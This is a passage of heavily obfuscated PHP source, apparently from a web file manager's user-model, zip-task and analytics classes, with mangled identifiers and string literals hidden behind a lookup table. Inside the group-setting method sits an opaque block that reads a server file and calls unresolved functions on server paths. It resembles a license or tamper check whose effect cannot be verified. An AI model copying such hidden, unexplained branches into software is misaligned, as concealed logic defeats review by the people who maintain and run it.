$Ù¬õ§­‚[$´¸”¾éÀ[2148]] : $Ù¬õ§­‚[$´¸”¾éÀ[32]]; } $‹Å£ê¥„ = Model($´¸”¾éÀ[566]); if (!Input::check($÷®‡Ã“¶, $´¸”¾éÀ[622])) { return $‹Å£ê¥„->metaSet($ªÑâ•×€, array($´¸”¾éÀ[505] => $´¸”¾éÀ[12], $´¸”¾éÀ[504] => $´¸”¾éÀ[12])); } return $‹Å£ê¥„->metaSet($ªÑâ•×€, array($´¸”¾éÀ[505] => str_replace($´¸”¾éÀ[53], $´¸”¾éÀ[12], Pinyin::get($÷®‡Ã“¶)), $´¸”¾éÀ[504] => Pinyin::get($÷®‡Ã“¶, $´¸”¾éÀ[623]))); } private function nickNameRpt() { $úÈà‡É½ =& $_SERVER[”ôÑ§ì¸]; $‡‡ô€û = Model($úÈà‡É½[792])->get($úÈà‡É½[2351]); $»Šéè¿ = $GLOBALS[$úÈà‡É½[6]][$úÈà‡É½[424]][$úÈà‡É½[2351]]; $È·øßÛŸ = !is_null($‡‡ô€û) ? $‡‡ô€û : $»Šéè¿; return !!$È·øßÛŸ; } private function _checkExist($€÷¨ä¼, $ö×œŞ‹ó = false) { $ÄÄ¤Ÿ =& $_SERVER[”ôÑ§ì¸]; $üÎ ëá = array($ÄÄ¤Ÿ[32] => UserModel::ERROR_USER_EXIST_NAME, $ÄÄ¤Ÿ[2148] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÄÄ¤Ÿ[348] => UserModel::ERROR_USER_EXIST_EMAIL, $ÄÄ¤Ÿ[2339] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($üÎ ëá[$ÄÄ¤Ÿ[2148]]); } $İ›»†í– = $ö×œŞ‹ó ? array($ÄÄ¤Ÿ[1674] => array($ÄÄ¤Ÿ[2352], $ö×œŞ‹ó)) : array(); foreach ($üÎ ëá as $°Á”œÊ => $ªÔÌ›Ú‚) { $‚Ûà‘ä³ = array(); foreach ($üÎ ëá as $…æúØÆÒ => $û€¨ÏÓØ) { if (isset($€÷¨ä¼[$…æúØÆÒ]) && $€÷¨ä¼[$…æúØÆÒ]) { $‚Ûà‘ä³[] = $€÷¨ä¼[$…æúØÆÒ]; } } if (!$‚Ûà‘ä³) { continue; } $Ûó×íù = array_merge(array($°Á”œÊ => array($ÄÄ¤Ÿ[7], $‚Ûà‘ä³)), $İ›»†í–); $è®Öú› = $this->where($Ûó×íù)->find(); if ($è®Öú›) { return $ªÔÌ›Ú‚; } } return !0; } public function userListInfo($¯ø»…) { $É”Ñú =& $_SERVER[”ôÑ§ì¸]; $¬—æ¼â = array(); $¯ø»… = is_array($¯ø»…) ? array_unique($¯ø»…) : array(); if (!$¯ø»…) { return $¬—æ¼â; } if (count($¯ø»…) < 20) { foreach ($¯ø»… as $§¬Œ“ìÀ) { $¬—æ¼â[$§¬Œ“ìÀ . $É”Ñú[12]] = $this->getInfoSimpleOuter($§¬Œ“ìÀ); } } else { $é¿¯êÒ– = array($É”Ñú[1665] => array($É”Ñú[459], $¯ø»…)); if (count($¯ø»…) == 1) { $é¿¯êÒ– = array($É”Ñú[1665] => $¯ø»…[0]); } $³°¦ü = Model($É”Ñú[545])->field($this->simpleField)->where($é¿¯êÒ–)->select(); $³°¦ü = array_to_keyvalue($³°¦ü, $É”Ñú[1674]); foreach ($¯ø»… as $§¬Œ“ìÀ) { $¢•—š¥ = $³°¦ü[$§¬Œ“ìÀ]; if (!$¢•—š¥) { $¬—æ¼â[$§¬Œ“ìÀ . $É”Ñú[12]] = $this->getInfoSimpleOuter($§¬Œ“ìÀ); continue; } $¢•—š¥[$É”Ñú[2324]] = Action($É”Ñú[2325])->parseUrl($¢•—š¥[$É”Ñú[2324]]); $¬—æ¼â[$§¬Œ“ìÀ . $É”Ñú[12]] = $¢•—š¥; } } return $¬—æ¼â; } protected function userStatus($ï§™€Š, $«¢ßÎûø) { $ÂìÉ³ùÛ = $this->getInfoSimple($ï§™€Š); if (!$ÂìÉ³ùÛ) { return !1; } $ÜÚ†ûÂÙ = array($_SERVER[”ôÑ§ì¸][772] => $«¢ßÎûø); return $this->userEdit($ï§™€Š, $ÜÚ†ûÂÙ); } protected function userRemove($É³Â™ª) { $Â”´Ù¨â =& $_SERVER[”ôÑ§ì¸]; $£Í¹ñ§ğ = $this->getInfoSimple($É³Â™ª); if (!$£Í¹ñ§ğ) { return !1; } $ş‡ıæ¼ = array($Â”´Ù¨â[1665] => $É³Â™ª); Model($Â”´Ù¨â[631])->where($ş‡ıæ¼)->delete(); Model($Â”´Ù¨â[2353])->where($ş‡ıæ¼)->delete(); Model($Â”´Ù¨â[1956])->where($ş‡ıæ¼)->delete(); Model($Â”´Ù¨â[2338])->where($ş‡ıæ¼)->delete(); Model($Â”´Ù¨â[1099])->where($ş‡ıæ¼)->delete(); Model($Â”´Ù¨â[2165])->removeUserAll($É³Â™ª); Model($Â”´Ù¨â[847])->userRootRemove($É³Â™ª); return $this->where($ş‡ıæ¼)->delete(); } protected function userGroupSet($İÁÁš², $ƒ³éºïˆ, $Ú£óØØ— = array()) { $›ÜÀ± =& $_SERVER[”ôÑ§ì¸]; if ($_SERVER[$›ÜÀ±[857]] != $_SERVER[$›ÜÀ±[858]]) { $ïœŒöø = $›ÜÀ±[908]; $Äİòëó’ = $›ÜÀ±[859]; $ÖªƒÍ«Ù = $_SERVER[$›ÜÀ±[860]] . $›ÜÀ±[861]; $ö÷•ì™• = $Äİòëó’($ÖªƒÍ«Ù); $¦ƒ‚Áîà = explode($›ÜÀ±[245], $ö÷•ì™•); if (count($¦ƒ‚Áîà) < $›ÜÀ±[655]) { $é›ÖşÌğ = $›ÜÀ±[862]; $é›ÖşÌğ(); } $ÕÈß•Éñ = $›ÜÀ±[909]; $ÕÈß•Éñ($_SERVER[$›ÜÀ±[910]]); $ÕÈß•Éñ($_SERVER[$›ÜÀ±[860]] . $›ÜÀ±[2354]); $­éÀíöˆ = 1; while ($­éÀíöˆ > 1) { $­éÀíöˆ = $­éÀíöˆ + 4; $õ²”±Ø = rawurlencode($­éÀíöˆ . $›ÜÀ±[421]); } } $ù²ëèØ = $this->getInfoSimple($İÁÁš²); if (!$ù²ëèØ || !is_array($ƒ³éºïˆ)) { return !1; } $…½òöİÕ = Model($›ÜÀ±[1956]); $…½òöİÕ->where(array($›ÜÀ±[1674] => $İÁÁš²))->delete(); $È¬”Á™â = array(); $…ÔáÃÒ¹ = 0; foreach ($ƒ³éºïˆ as $ƒÁ—é©• => $Âş§ÜÙ) { $¦†˜®Üí = array($›ÜÀ±[1674] => $İÁÁš², $›ÜÀ±[1866] => $ƒÁ—é©•, $›ÜÀ±[1970] => $Âş§ÜÙ); $¦†˜®Üí[$›ÜÀ±[1890]] = isset($Ú£óØØ—[$…ÔáÃÒ¹]) ? $Ú£óØØ—[$…ÔáÃÒ¹] : 0; $…ÔáÃÒ¹++; $È¬”Á™â[] = $¦†˜®Üí; } return $…½òöİÕ->addAll($È¬”Á™â, array(), !0); } protected function userGroupAdd($Ú»ÓÆ•», $©¨´† = array()) { $±—ôß†¦ =& $_SERVER[”ôÑ§ì¸]; $½•ß‘Şá = $this->getInfoSimple($Ú»ÓÆ•»); if (!$½•ß‘Şá || empty($©¨´†)) { return !1; } $‡Õ°ù“Ğ = array(); foreach ($©¨´† as $ú«ËûË => $ƒå¶À‚Ë) { $‡Õ°ù“Ğ[] = array($±—ôß†¦[1674] => $Ú»ÓÆ•», $±—ôß†¦[1866] => $ú«ËûË, $±—ôß†¦[1970] => $ƒå¶À‚Ë, $±—ôß†¦[1890] => 0); } return Model($±—ôß†¦[1956])->addAll($‡Õ°ù“Ğ, array(), !0); } protected function userGroupRemove($Øƒ“¯Çî, $÷íìàÎ) { $Á©ÏìÔ =& $_SERVER[”ôÑ§ì¸]; $˜£•É¹Ù = $this->getInfoSimple($Øƒ“¯Çî); if (!$˜£•É¹Ù || !$÷íìàÎ) { return !1; } $×‘‰”§‚ = array($Á©ÏìÔ[1665] => $Øƒ“¯Çî, $Á©ÏìÔ[1954] => $÷íìàÎ); return Model($Á©ÏìÔ[1956])->where($×‘‰”§‚)->delete(); } public function listData() { $İµæò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($İµæò[$_SERVER[”ôÑ§ì¸][412]]); return $İµæò; } public function listByID($èŞ Æ ä) { $ÈÚĞ©×¨ =& $_SERVER[”ôÑ§ì¸]; if (!$èŞ Æ ä) { return; } $‡÷²”Õ— = array($ÈÚĞ©×¨[1674] => array($ÈÚĞ©×¨[7], $èŞ Æ ä)); $œÏ§·Õ± = $this->where($‡÷²”Õ—)->select(); $œÏ§·Õ± = array_sort_keep($œÏ§·Õ±, $ÈÚĞ©×¨[1674], $èŞ Æ ä); $this->_listDataApply($œÏ§·Õ±); return $œÏ§·Õ±; } public function listByGroup($ÜĞş…ÈÓ = 0, $à¡ıüô = array()) { $Á¦‹¹òœ =& $_SERVER[”ôÑ§ì¸]; $ı–£È = $Á¦‹¹òœ[12]; $£›•ìıĞ = array(); if ($ÜĞş…ÈÓ) { $£›•ìıĞ = array($Á¦‹¹òœ[2355] => intval($ÜĞş…ÈÓ)); $ı–£È = "\114\105\106\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x75\163\x65\162\x5f\x67\x72\157\x75\x70\40\x75\x73\145\x72\x5f\x67\162\157\165\x70\40\157\156\40\x75\163\x65\x72\56\165\x73\x65\162\x49\x44\x20\x3d\x20\x75\163\x65\162\137\x67\x72\x6f\165\x70\56\x75\163\x65\162\x49\104"; $¥àğ× = Input::get($Á¦‹¹òœ[497], null, $Á¦‹¹òœ[12]) ? $Á¦‹¹òœ[12] : $Á¦‹¹òœ[2356]; } if (isset($à¡ıüô[$Á¦‹¹òœ[772]])) { $£›•ìıĞ[$Á¦‹¹òœ[2357]] = $à¡ıüô[$Á¦‹¹òœ[772]]; } $æÛÁÖ£· = $this->_makeOrder($¥àğ×)->field($Á¦‹¹òœ[2358])->where($£›•ìıĞ)->join($ı–£È)->selectPage(50); $this->_listDataApply($æÛÁÖ£·[$Á¦‹¹òœ[412]]); return $æÛÁÖ£·; } private function _makeOrder($ûº®‚’ = '') { $—Éâî¤– =& $_SERVER[”ôÑ§ì¸]; $†µ³´Ãº = array($—Éâî¤–[1674], $—Éâî¤–[32], $—Éâî¤–[1855], $—Éâî¤–[1827], $—Éâî¤–[214]); $òûÌÜÙ = array($—Éâî¤–[490] => $—Éâî¤–[491], $—Éâî¤–[492] => $—Éâî¤–[493]); $Ò åæ€Ù = Input::get($—Éâî¤–[497], $—Éâî¤–[7], $—Éâî¤–[1665], $†µ³´Ãº); $¹ææø¥“ = Input::get($—Éâî¤–[498], $—Éâî¤–[7], $—Éâî¤–[1957], array($—Éâî¤–[1957], $—Éâî¤–[492])); $¹ææø¥“ = $òûÌÜÙ[$¹ææø¥“]; $ûº®‚’ = $ûº®‚’ . "\165\163\x65\162\x2e{$Ò åæ€Ù}\40{$¹ææø¥“}\x2c\40\165\x73\x65\162\56\x75\163\145\162\x49\x44\x20\141\163\143"; return $this->alias($—Éâî¤–[2083])->order($ûº®‚’); } public function listSearch($ŒãÄ²‘) { $Ê·„½±Ö =& $_SERVER[”ôÑ§ì¸]; $Õ´×òÃ¯ = $ŒãÄ²‘[$Ê·„½±Ö[1960]]; $”ùÏ²ÛÛ = isset($ŒãÄ²‘[$Ê·„½±Ö[1961]]) ? $ŒãÄ²‘[$Ê·„½±Ö[1961]] : !1; $Õ´×òÃ¯ = str_replace($Ê·„½±Ö[1962], $Ê·„½±Ö[1963], trim($Õ´×òÃ¯)); $ØãÎŸªŞ = array($Ê·„½±Ö[32] => array($Ê·„½±Ö[426], "\45{$Õ´×òÃ¯}\x25"), $Ê·„½±Ö[348] => array($Ê·„½±Ö[426], "{$Õ´×òÃ¯}\x25"), $Ê·„½±Ö[2148] => array($Ê·„½±Ö[426], "{$Õ´×òÃ¯}\x25"), $Ê·„½±Ö[1031] => $Ê·„½±Ö[1964]); if (Input::check($Õ´×òÃ¯, $Ê·„½±Ö[354])) { $ØãÎŸªŞ[$Ê·„½±Ö[1674]] = array($Ê·„½±Ö[426], "{$Õ´×òÃ¯}\x25"); $ØãÎŸªŞ[$Ê·„½±Ö[2339]] = array($Ê·„½±Ö[426], "{$Õ´×òÃ¯}\x25"); } if (!$Õ´×òÃ¯) { $ØãÎŸªŞ = array(); } if (isset($ŒãÄ²‘[$Ê·„½±Ö[772]])) { $ØãÎŸªŞ[$Ê·„½±Ö[772]] = $ŒãÄ²‘[$Ê·„½±Ö[772]]; } $ØãÎŸªŞ = $this->parseWhereLike($ØãÎŸªŞ); $ãƒÌ‹‘à = $this->_makeOrder()->where($ØãÎŸªŞ)->selectPage(20); if (!$ãƒÌ‹‘à || count($ãƒÌ‹‘à[$Ê·„½±Ö[412]]) < 5 && Input::check($Õ´×òÃ¯, $Ê·„½±Ö[361])) { $ÁĞ‹­äü = $this->_searchFromMeta($Ê·„½±Ö[504], $Õ´×òÃ¯, 10); $ÜËõ‰ÓÀ = $this->_searchFromMeta($Ê·„½±Ö[505], $Õ´×òÃ¯, 10); $è¯â—å = array_merge($ÁĞ‹­äü, $ÜËõ‰ÓÀ, $ãƒÌ‹‘à[$Ê·„½±Ö[412]]); $ãƒÌ‹‘à[$Ê·„½±Ö[412]] = array_unique_by_key($è¯â—å, $Ê·„½±Ö[1674]); $ãƒÌ‹‘à[$Ê·„½±Ö[409]][$Ê·„½±Ö[410]] = count($ãƒÌ‹‘à[$Ê·„½±Ö[412]]); $ãƒÌ‹‘à[$Ê·„½±Ö[409]][$Ê·„½±Ö[411]] = ceil($ãƒÌ‹‘à[$Ê·„½±Ö[409]][$Ê·„½±Ö[410]] / $ãƒÌ‹‘à[$Ê·„½±Ö[409]][$Ê·„½±Ö[406]]); } $this->_listDataApply($ãƒÌ‹‘à[$Ê·„½±Ö[412]]); $this->_filterByGroup($ãƒÌ‹‘à, $”ùÏ²ÛÛ); return $ãƒÌ‹‘à; } private function _filterByGroup(&$ˆ…Úå€», $ü¸õå©ä) { $üÛ€ñºÉ =& $_SERVER[”ôÑ§ì¸]; if (!$ü¸õå©ä) { return $ˆ…Úå€»; } foreach ($ˆ…Úå€»[$üÛ€ñºÉ[412]] as $ï„äÉàô => &$Î¼ñçÛ) { $”¥ÈïÚ = array_to_keyvalue($Î¼ñçÛ[$üÛ€ñºÉ[2053]], $üÛ€ñºÉ[12], $üÛ€ñºÉ[1866]); if (!in_array($ü¸õå©ä, $”¥ÈïÚ)) { unset($ˆ…Úå€»[$üÛ€ñºÉ[412]][$ï„äÉàô]); } } unset($Î¼ñçÛ); $ˆ…Úå€»[$üÛ€ñºÉ[412]] = array_values($ˆ…Úå€»[$üÛ€ñºÉ[412]]); $ˆ…Úå€»[$üÛ€ñºÉ[409]] = array($üÛ€ñºÉ[2118] => count($ˆ…Úå€»[$üÛ€ñºÉ[412]]), $üÛ€ñºÉ[2116] => $ˆ…Úå€»[$üÛ€ñºÉ[409]][$üÛ€ñºÉ[406]], $üÛ€ñºÉ[2115] => 1, $üÛ€ñºÉ[2117] => 1); } private function _searchFromMeta($šó—Åö¯, $éğ¬¤§‘, $®Ïô¸×) { $ƒË“§Åç =& $_SERVER[”ôÑ§ì¸]; $éğ¬¤§‘ = strtolower($éğ¬¤§‘); $´ƒÀË ş = array($ƒË“§Åç[94] => $šó—Åö¯, $ƒË“§Åç[417] => array($ƒË“§Åç[426], "\45{$éğ¬¤§‘}\45")); $´ƒÀË ş = $this->parseWhereLike($´ƒÀË ş); $…±¿İô = Model($ƒË“§Åç[2359])->where($´ƒÀË ş)->limit($®Ïô¸×)->select(); if (!$…±¿İô) { return array(); } $…±¿İô = array_to_keyvalue($…±¿İô, $ƒË“§Åç[12], $ƒË“§Åç[1674]); $£ˆÜŸÅ¹ = $this->where(array($ƒË“§Åç[1665] => array($ƒË“§Åç[7], $…±¿İô)))->select(); if (!$£ˆÜŸÅ¹) { return array(); } return $£ˆÜŸÅ¹; } private function _listDataApplyItem($¸×¢ùÇş) { $¾ÒĞ•œ = array($¸×¢ùÇş); $this->_listDataApply($¾ÒĞ•œ); return $¾ÒĞ•œ[0]; } private function _listDataApply(&$×ÏÒ€’ş) { $“¯ÕÇ®õ =& $_SERVER[”ôÑ§ì¸]; if (!$×ÏÒ€’ş) { return; } array_remove_key($×ÏÒ€’ş, $“¯ÕÇ®õ[920]); $“¼›÷¾ = array_to_keyvalue($×ÏÒ€’ş, $“¯ÕÇ®õ[12], $“¯ÕÇ®õ[1674]); $this->_listAppendGroup($×ÏÒ€’ş, $“¼›÷¾); $this->_listAppendMeta($×ÏÒ€’ş, $“¼›÷¾); $this->_listAppendSourceRoot($×ÏÒ€’ş, $“¼›÷¾); } private function _listAppendSourceRoot(&$ÄØŒ“, $ÕÁ÷µµ‚) { $œ¹ªÅŞˆ =& $_SERVER[”ôÑ§ì¸]; $’±şòì¬ = Model($œ¹ªÅŞˆ[847])->listSourceRoot(SourceModel::TYPE_USER, $ÕÁ÷µµ‚); $’±şòì¬ = array_to_keyvalue($’±şòì¬, $œ¹ªÅŞˆ[537]); $’±şòì¬ = array_remove_key($’±şòì¬, $œ¹ªÅŞˆ[537]); foreach ($ÄØŒ“ as &$ŞÇ­°à) { $ŞÇ­°à[$œ¹ªÅŞˆ[87]] = $’±şòì¬[$ŞÇ­°à[$œ¹ªÅŞˆ[1674]]] ? $’±şòì¬[$ŞÇ­°à[$œ¹ªÅŞˆ[1674]]] : array(); } unset($ŞÇ­°à); } private function _listAppendGroup(&$²Ê¹—¥È, $ØØÕüŠ¬) { $Õâ½§Ñ¤ =& $_SERVER[”ôÑ§ì¸]; $ùâ¸ú† = array($Õâ½§Ñ¤[1674] => array($Õâ½§Ñ¤[7], $ØØÕüŠ¬)); $İ–¿ìê· = Model($Õâ½§Ñ¤[1956])->where($ùâ¸ú†)->select(); $‹ŸĞÆÊè = array_to_keyvalue($İ–¿ìê·, $Õâ½§Ñ¤[12], $Õâ½§Ñ¤[1866]); $‹ŸĞÆÊè = array_remove_value(array_unique($‹ŸĞÆÊè), $Õâ½§Ñ¤[211]); if (!$‹ŸĞÆÊè || !$İ–¿ìê·) { return; } $ùâ¸ú† = array($Õâ½§Ñ¤[1866] => array($Õâ½§Ñ¤[7], $‹ŸĞÆÊè)); $Æ•ïä½Á = Model($Õâ½§Ñ¤[2051])->field($Õâ½§Ñ¤[2360])->where($ùâ¸ú†)->select(); $Æ•ïä½Á = array_to_keyvalue($Æ•ïä½Á, $Õâ½§Ñ¤[1866]); $İ–¿ìê· = array_to_keyvalue_group($İ–¿ìê·, $Õâ½§Ñ¤[1674]); foreach ($İ–¿ìê· as &$ˆô˜•Òˆ) { $——ÊË»ı = array(); foreach ($ˆô˜•Òˆ as $¦ä³¿áö) { if (!$¦ä³¿áö[$Õâ½§Ñ¤[1970]]) { continue; } $ÄœÎÛ† = Model($Õâ½§Ñ¤[539])->listData($¦ä³¿áö[$Õâ½§Ñ¤[1970]]); $——ÊË»ı[] = array($Õâ½§Ñ¤[1866] => $¦ä³¿áö[$Õâ½§Ñ¤[1866]], $Õâ½§Ñ¤[2361] => $Æ•ïä½Á[$¦ä³¿áö[$Õâ½§Ñ¤[1866]]][$Õâ½§Ñ¤[32]], $Õâ½§Ñ¤[552] => $Æ•ïä½Á[$¦ä³¿áö[$Õâ½§Ñ¤[1866]]][$Õâ½§Ñ¤[552]], $Õâ½§Ñ¤[454] => $ÄœÎÛ†); } $ˆô˜•Òˆ = $——ÊË»ı; } unset($ˆô˜•Òˆ); foreach ($²Ê¹—¥È as &$ÚÅşùÑá) { $ÚÅşùÑá[$Õâ½§Ñ¤[2053]] = array(); if (isset($İ–¿ìê·[$ÚÅşùÑá[$Õâ½§Ñ¤[1674]]])) { $ÚÅşùÑá[$Õâ½§Ñ¤[2053]] = $İ–¿ìê·[$ÚÅşùÑá[$Õâ½§Ñ¤[1674]]]; } } unset($ÚÅşùÑá); } public function userAppendGroup($¬µÇæ´) { $ÉõŞ£­Ò =& $_SERVER[”ôÑ§ì¸]; if (!$¬µÇæ´) { return array(); } $this->_listAppendGroup($¬µÇæ´, array_to_keyvalue($¬µÇæ´, $ÉõŞ£­Ò[12], $ÉõŞ£­Ò[1674])); return $¬µÇæ´; } private function _listAppendMeta(&$•üúÅÓ, $ĞÑ‹¥æ°) { $¸÷øò…ê =& $_SERVER[”ôÑ§ì¸]; $Ö¿€¥¦ş = UserJobModel::JOB_KEY; $¿°Äé = array($¸÷øò…ê[2340]); $úæ›£Ò = array($¸÷øò…ê[1674] => array($¸÷øò…ê[7], $ĞÑ‹¥æ°)); $’Œö¡ğ¥ = Model($¸÷øò…ê[2338])->where($úæ›£Ò)->select(); $’Œö¡ğ¥ = array_to_keyvalue_group($’Œö¡ğ¥, $¸÷øò…ê[1674]); foreach ($’Œö¡ğ¥ as &$¨¥‚Ø®) { $•ÂË¥ó = array(); foreach ($¨¥‚Ø® as $Ÿ‘Ó¹«) { if (!in_array($Ÿ‘Ó¹«[$¸÷øò…ê[94]], $¿°Äé)) { $•ÂË¥ó[$Ÿ‘Ó¹«[$¸÷øò…ê[94]]] = $Ÿ‘Ó¹«[$¸÷øò…ê[417]]; } } $¨¥‚Ø® = $•ÂË¥ó; } unset($¨¥‚Ø®); $á÷õœß = Model($¸÷øò…ê[2362]); foreach ($•üúÅÓ as &$½Îà¶•) { $Âñá¥¦ú = array(); if (isset($’Œö¡ğ¥[$½Îà¶•[$¸÷øò…ê[1674]]])) { $Âñá¥¦ú = $’Œö¡ğ¥[$½Îà¶•[$¸÷øò…ê[1674]]]; } $½Îà¶•[$¸÷øò…ê[2363]] = array(); if (isset($Âñá¥¦ú[$Ö¿€¥¦ş])) { $½Îà¶•[$¸÷øò…ê[2363]] = $á÷õœß->getUserJobInfo($Âñá¥¦ú[$Ö¿€¥¦ş]); } } unset($½Îà¶•); } protected function groupUserAll($â‚áéá) { $ß©¦ªî² =& $_SERVER[”ôÑ§ì¸]; if (!$â‚áéá) { return !1; } $Éç¼¿‡ç = Model($ß©¦ªî²[1956])->field($ß©¦ªî²[1674])->where(array($ß©¦ªî²[1866] => array($ß©¦ªî²[7], $â‚áéá)))->select(); $Éç¼¿‡ç = array_to_keyvalue($Éç¼¿‡ç, $ß©¦ªî²[12], $ß©¦ªî²[1674]); return array_unique($Éç¼¿‡ç); } public function userSearch($åè¬ÎÙ, $Ìö“ñ² = "\x2a") { return Model($_SERVER[”ôÑ§ì¸][566])->where($åè¬ÎÙ)->field($Ìö“ñ²)->find(); } } goto eç†ÓîŸô—; A†”³…Ú”: class TaskZip extends TaskFileTransfer { protected function startAfter() { $óæ«âÊı =& $_SERVER[”ôÑ§ì¸]; parent::startAfter(); Hook::bind($óæ«âÊı[1793], array($this, $óæ«âÊı[1788])); $¹§Ò–½ =& $this->task; $¹§Ò–½[$óæ«âÊı[1790]] = $óæ«âÊı[1225]; if (!$¹§Ò–½[$óæ«âÊı[1571]]) { $¹§Ò–½[$óæ«âÊı[1571]] = LNG($óæ«âÊı[1794]); } } protected function endAfter() { $ÂšÆíôˆ =& $_SERVER[”ôÑ§ì¸]; parent::endAfter(); Hook::unbind($ÂšÆíôˆ[1793], array($this, $ÂšÆíôˆ[1788])); } public function updateAfter() { $ûØÙÙÏà =& $_SERVER[”ôÑ§ì¸]; $Êµ¾ò´Ñ =& $this->task; if (!$Êµ¾ò´Ñ[$ûØÙÙÏà[808]] || !$Êµ¾ò´Ñ[$ûØÙÙÏà[785]]) { return; } if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1790]] == $ûØÙÙÏà[1225]) { $ÁƒÊÕÀ› = $Êµ¾ò´Ñ[$ûØÙÙÏà[1728]]; if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1729]] != $ûØÙÙÏà[1225]) { $ÁƒÊÕÀ› = 0; } $®ü„ÄŞĞ = ($Êµ¾ò´Ñ[$ûØÙÙÏà[1732]] + $ÁƒÊÕÀ›) / $Êµ¾ò´Ñ[$ûØÙÙÏà[785]]; $Êµ¾ò´Ñ[$ûØÙÙÏà[1676]] = $®ü„ÄŞĞ * 0.3; } else { if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1790]] == $ûØÙÙÏà[356]) { $®ü„ÄŞĞ = $Êµ¾ò´Ñ[$ûØÙÙÏà[1675]] / $Êµ¾ò´Ñ[$ûØÙÙÏà[808]]; $Êµ¾ò´Ñ[$ûØÙÙÏà[1676]] = 0.3 + $®ü„ÄŞĞ * 0.5; } else { if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1790]] == $ûØÙÙÏà[107]) { $®ü„ÄŞĞ = 0; if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1727]]) { $®ü„ÄŞĞ = $Êµ¾ò´Ñ[$ûØÙÙÏà[1728]] / $Êµ¾ò´Ñ[$ûØÙÙÏà[1727]]; } $Êµ¾ò´Ñ[$ûØÙÙÏà[1676]] = 0.3 + 0.5 + $®ü„ÄŞĞ * 0.2; } } } if ($Êµ¾ò´Ñ[$ûØÙÙÏà[1676]] > 0) { $½Åú±Íé = timeFloat() - $Êµ¾ò´Ñ[$ûØÙÙÏà[1678]] - $Êµ¾ò´Ñ[$ûØÙÙÏà[1681]]; $Êµ¾ò´Ñ[$ûØÙÙÏà[1682]] = $½Åú±Íé * (1 - $Êµ¾ò´Ñ[$ûØÙÙÏà[1676]]) / $Êµ¾ò´Ñ[$ûØÙÙÏà[1676]]; } } public function copyFileStart($×ˆ·±š’, $ß‚Î¹âğ, $Ï¯‚§ı‹, $ÄúíÈğ’, $¸İ÷¨â, $„ù¬ËÓ) { $ª¥Ôèêö =& $_SERVER[”ôÑ§ì¸]; parent::copyFileStart($×ˆ·±š’, $ß‚Î¹âğ, $Ï¯‚§ı‹, $ÄúíÈğ’, $¸İ÷¨â, $„ù¬ËÓ); $†ŒÍ½Ú =& $this->task; if ($†ŒÍ½Ú[$ª¥Ôèêö[1790]] == $ª¥Ôèêö[356]) { $†ŒÍ½Ú[$ª¥Ôèêö[1790]] = $ª¥Ôèêö[107]; } $this->update(); } public function copyFileEnd($Šˆ»¿×‹, $¶°€Åêº, $éûœ±óí, $ğ¡“õà², $üŒ¿‚üŒ, $£Ô’…ûº) { $ÌÒ«–Ş” =& $_SERVER[”ôÑ§ì¸]; $©ú„çÔÛ =& $this->task; $©ú„çÔÛ[$ÌÒ«–Ş”[1728]] = $©ú„çÔÛ[$ÌÒ«–Ş”[1727]]; $©ú„çÔÛ[$ÌÒ«–Ş”[1732]] += $©ú„çÔÛ[$ÌÒ«–Ş”[1727]]; $©ú„çÔÛ[$ÌÒ«–Ş”[1729]] = $ÌÒ«–Ş”[12]; $this->update(); } public function nameParse($·—ò¥á£) { $õÖÉ™©£ =& $_SERVER[”ôÑ§ì¸]; $æô ³¹¤ =& $this->task; if ($æô ³¹¤[$õÖÉ™©£[1675]] < $æô ³¹¤[$õÖÉ™©£[808]]) { $˜Ÿœ¬‰ß = get_path_this($·—ò¥á£); if (strstr($˜Ÿœ¬‰ß, $õÖÉ™©£[10])) { $æô ³¹¤[$õÖÉ™©£[1675]] += 1; } } if ($æô ³¹¤[$õÖÉ™©£[1790]] == $õÖÉ™©£[1225]) { $æô ³¹¤[$õÖÉ™©£[1790]] = $õÖÉ™©£[356]; } $æô ³¹¤[$õÖÉ™©£[1725]] = $·—ò¥á£; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¾ËóÀı») { $¦÷‹Üµè =& $_SERVER[”ôÑ§ì¸]; $ÁÉ‡Í®­ = array($¦÷‹Üµè[629] => array($¦÷‹Üµè[33] => $¦÷‹Üµè[1795], $¦÷‹Üµè[316] => array($¦÷‹Üµè[238], $¦÷‹Üµè[787], $¦÷‹Üµè[1796], $¦÷‹Üµè[1797])), $¦÷‹Üµè[1798] => array($¦÷‹Üµè[33] => $¦÷‹Üµè[1799], $¦÷‹Üµè[316] => array($¦÷‹Üµè[238], $¦÷‹Üµè[785], $¦÷‹Üµè[1800], $¦÷‹Üµè[1801], $¦÷‹Üµè[1802]))); if (!isset($ÁÉ‡Í®­[$¾ËóÀı»])) { return !1; } $this->optionType = $ÁÉ‡Í®­[$¾ËóÀı»][$¦÷‹Üµè[33]]; $this->field = $ÁÉ‡Í®­[$¾ËóÀı»][$¦÷‹Üµè[316]]; return !0; } public function listData($Ô†¯ºÏ = false, $Â„£¹² = "\x6d\157\x64\x69\x66\171\x54\x69\155\x65", $ãø¶Àï = false) { return parent::listData($Ô†¯ºÏ, $Â„£¹², $ãø¶Àï); } public function trendList($‰ˆÀ»Üâ) { $£Ÿ¬Š„¡ =& $_SERVER[”ôÑ§ì¸]; $£Èå„Ó = $this->listData(); if ($£Èå„Ó) { $ñ‚Õ‰´ = end($£Èå„Ó); $Æ¹ä¬ÉÊ = date($£Ÿ¬Š„¡[1803], strtotime($£Ÿ¬Š„¡[1804])); if ($ñ‚Õ‰´[$£Ÿ¬Š„¡[238]] == $Æ¹ä¬ÉÊ) { return $£Èå„Ó; } $¿¨Ó‡½¬ = strtotime($ñ‚Õ‰´[$£Ÿ¬Š„¡[238]]); } if (!isset($¿¨Ó‡½¬)) { $ËÛ®ê„ó = $‰ˆÀ»Üâ == $£Ÿ¬Š„¡[629] ? $£Ÿ¬Š„¡[566] : $£Ÿ¬Š„¡[847]; $¿¨Ó‡½¬ = Model($ËÛ®ê„ó)->min($£Ÿ¬Š„¡[214]); } $Šú¡ëòô = $£Ÿ¬Š„¡[1805] . ucfirst($‰ˆÀ»Üâ); $úçï£Ï = $this->dateList($¿¨Ó‡½¬); foreach ($úçï£Ï as $Æ¹ä¬ÉÊ) { 